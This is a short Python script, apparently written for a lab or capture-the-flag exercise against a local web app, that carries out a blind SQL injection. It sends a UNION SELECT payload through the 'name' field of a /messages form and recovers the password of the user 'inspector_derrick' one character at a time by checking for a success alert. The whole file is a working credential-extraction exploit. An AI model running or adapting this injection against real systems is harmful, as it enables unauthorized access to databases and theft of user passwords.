#%%
import requests
from bs4 import BeautifulSoup
#%%
def guess_pwd(start_with):   
    pload_b = {
        'name': "' UNION SELECT name,password FROM users WHERE password LIKE '{}%' AND name='inspector_derrick".format(start_with)
    }
    #print(pload_b['name'])
    resp_b = requests.post('http://localhost:80/messages', data=pload_b)
    #print(resp_b.content.decode())
    return len(BeautifulSoup(resp_b.content).find_all('div', 'alert-success')) > 0
#%%
guess_pwd('a')

#%%
chars = [c for i in range(26) for c in [chr(ord('a')+i), chr(ord('A')+i)]]
nums = [str(i) for i in range(10)]

last_length = -1
password = ''
while len(password) > last_length:
    last_length = len(password)
    for c in chars + nums:
        if guess_pwd(password + c):
            password += c
            continue

#%%
print(password)



#%%
